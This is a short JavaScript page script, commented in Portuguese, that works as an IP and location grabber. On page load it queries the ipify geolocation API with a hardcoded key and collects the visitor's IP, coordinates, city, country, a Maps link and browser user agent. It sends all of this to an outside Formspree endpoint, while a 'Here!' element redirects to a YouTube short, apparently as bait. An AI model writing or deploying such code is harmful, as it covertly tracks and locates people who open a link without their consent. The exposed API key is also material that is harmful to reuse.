const formspreeEndpoint = "https://formspree.io/f/mnngrgzw"; // substitua se precisar
const apiKey = "at_qJQg5RedA4H2Kd9IGXn7PzqG24UOc"; // sua chave ipify

function sendToFormspree(payload) {
  return fetch(formspreeEndpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}

function getIPAndGeo() {
  const statusEl = document.getElementById('status');
  if (statusEl) statusEl.textContent = "Status: obtendo IP e localização...";

  const url = `https://geo.ipify.org/api/v2/country,city?apiKey=${apiKey}`;

  fetch(url)
    .then(r => {
      if (!r.ok) throw new Error('Falha ao consultar ipify geo API');
      return r.json();
    })
    .then(info => {
      const payload = {
        timestamp: new Date().toISOString(),
        ip: info.ip,
        latitude: info.location.lat,
        longitude: info.location.lng,
        city: info.location.city,
        region: info.location.region,
        country: info.location.country,
        google_maps_link: info.location.lat && info.location.lng ? `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}` : null,
        user_agent: navigator.userAgent,
        note: "Localização por ipify Geo API"
      };

      if (statusEl) statusEl.textContent = `Status: localização aproximada (${info.location.city || 'n/a'}, ${info.location.region || ''}). Enviando...`;
      return sendToFormspree(payload);
    })
    .then(() => {
      if (statusEl) statusEl.textContent = "Status: dados enviados com sucesso.";
    })
    .catch(err => {
      if (statusEl) statusEl.textContent = "Status: erro ao obter IP/geo.";
      console.warn(err);
    });
}

// Chama ao carregar a página
window.addEventListener('load', getIPAndGeo);

// Redirecionamento do link
const here = document.getElementById('Here!');
if (here) {
  here.addEventListener('click', function (event) {
    event.preventDefault();
    window.location.href = 'https://youtube.com/shorts/UM7TpdnbWfY?si=d_vDGrLYHqp5QZys';
  });
}
